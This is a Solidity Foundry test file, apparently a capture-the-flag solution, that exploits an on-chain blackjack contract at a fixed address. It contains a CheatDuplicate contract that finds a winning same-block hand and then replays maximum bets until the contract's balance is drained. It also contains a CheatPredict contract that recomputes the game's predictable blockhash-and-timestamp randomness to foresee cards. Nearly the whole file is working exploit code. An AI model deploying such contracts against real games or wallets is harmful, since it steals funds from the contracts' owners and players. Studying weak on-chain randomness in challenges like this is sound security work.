// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import "src/Challenge.sol";

interface IBlackJack {
    function deal() external payable;

    function hit() external;

    function stand() external;

    function getPlayerCard(uint8 id) external view returns (uint8);

    function getHouseCard(uint8 id) external view returns (uint8);
}

contract DAITest is Test {
    address private immutable BLACKJACK =
        0xA65D59708838581520511d98fB8b5d1F76A96cad;

    Challenge public challenge;
    uint public minBet = 0.05 ether; // 0.05 eth
    uint public maxBet = 5 ether;
    IBlackJack public blackjack;

    function setUp() public {
        vm.deal(address(this), 1565 ether);
        payable(BLACKJACK).transfer(51.034 ether);
        challenge = new Challenge(BLACKJACK);
        blackjack = IBlackJack(BLACKJACK);
    }

    receive() external payable {}

    function testSteal() public {
        require(address(BLACKJACK).balance >= 50 ether);

        CheatDuplicate cheat = new CheatDuplicate(address(BLACKJACK));
        console.log("deploy CheatDuplicate: ", address(cheat));
        payable(cheat).transfer(50 ether);
        for (uint i = 0; i < 10; i++) {
            console.log("cheat: ", i);
            cheat.cheat();
            if(address(BLACKJACK).balance == 0) {
                break;
            }
            vm.warp(block.timestamp + 10000);
        }

        assertEq(address(BLACKJACK).balance , 0 );
    }

}
contract CheatDuplicate {
    // idea is on same block deal same game always have same cards
    IBlackJack public blackjack;
    uint8[] public previous = new uint8[](3);
    uint8[] public next = new uint8[](3);
    constructor(address _blackjack) public {
        blackjack = IBlackJack(_blackjack);
    }
    receive() external payable {}
    function cheat() public payable {
        if(address(blackjack).balance == 0) {
            return;
        }

        previous = new uint8[](3);
        uint startBalance = address(this).balance;

        blackjack.deal{value: 0.05 ether}();
        previous[0] = blackjack.getPlayerCard(0);
        previous[1] = blackjack.getPlayerCard(1);
        previous[2] = blackjack.getHouseCard(0);
        blackjack.stand();

        uint currentBalance = address(this).balance;
        if(currentBalance > startBalance) {
            console.log("cheat success");
            stealVictory();
        }
        else {
            console.log("cheat fail");
        }
        // next = new uint8[](3);
        // blackjack.deal{value: 0.05 ether}();
        // next[0] = blackjack.getPlayerCard(0);
        // next[1] = blackjack.getPlayerCard(1);
        // next[2] = blackjack.getHouseCard(0);
        // blackjack.stand();

        // require(previous[0] == next[0]);
        // require(previous[1] == next[1]);
        // require(previous[2] == next[2]);
        
    }

    function stealVictory() public {
        
        while(address(blackjack).balance > 0) {
            uint targetBalance = address(blackjack).balance;
            uint deposit = 5 ether;
            if(targetBalance < 0.05 ether) {
                payable(address(blackjack)).transfer(5 ether - targetBalance);
            }
            else if(targetBalance < deposit) {
                deposit = targetBalance;
            }
            console.log("currentBalance: %e", address(blackjack).balance);
            console.log("victory deposit: ", deposit);
            // deal and win
            blackjack.deal{value: deposit}();
            blackjack.stand();
            console.log("afterBalance: %e ", address(blackjack).balance);
        }
    }
}
contract CheatPredict {
    IBlackJack public blackjack;
    uint public predict0;
    uint public predict1;
    uint public predict2;
    uint8[] public cacheCards;
    constructor(address _blackjack) public {
        blackjack = IBlackJack(_blackjack);
    }

    function deal() public payable returns (uint8[] memory cards) {
        
        cards = new uint8[](21);
        uint i = 0;
        cards[i++] = predictdeal(address(this), 0);
        cards[i++] = predictdeal(address(this), 1);
        cards[i++] = predictdeal(address(this), 2);

        cards[i++] = predictdeal2(address(this), 0);
        cards[i++] = predictdeal2(address(this), 1);
        cards[i++] = predictdeal2(address(this), 2);

        blackjack.deal{value: msg.value}();
        
        cards[i++] = blackjack.getPlayerCard(0);
        cards[i++] = blackjack.getPlayerCard(1);
        cards[i++] = blackjack.getHouseCard(0);

        cards[i++] = predictdeal(address(this), 0);
        cards[i++] = predictdeal(address(this), 1);
        cards[i++] = predictdeal(address(this), 2);

        cards[i++] = predictdeal2(address(this), 0);
        cards[i++] = predictdeal2(address(this), 1);
        cards[i++] = predictdeal2(address(this), 2);
        
        cacheCards = cards;
    }

    function getCacheCards() public view returns (uint8[] memory) {
        return cacheCards;
    }

    

    receive() external payable {}
    function getPlayerCard(uint8 id) public view returns(uint8) {
        return blackjack.getPlayerCard(id);
	}

	function getHouseCard(uint8 id) public  view returns(uint8) {
        return  blackjack.getHouseCard(id);
	}
    function predictdeal(
        address player,
        uint8 cardNumber
    ) public view returns (uint8) {
        uint timestamp = block.timestamp;
        uint hashed = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    player,
                    cardNumber,
                    timestamp
                )
            )
        );
        return uint8(hashed) % 52;
    }

    function predictdeal2(
        address player,
        uint8 cardNumber
    ) public view returns (uint8) {
        uint timestamp = block.timestamp;
        uint hashed = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number),
                    player,
                    cardNumber,
                    timestamp
                )
            )
        );
        return uint8(hashed) % 52;
    }
}
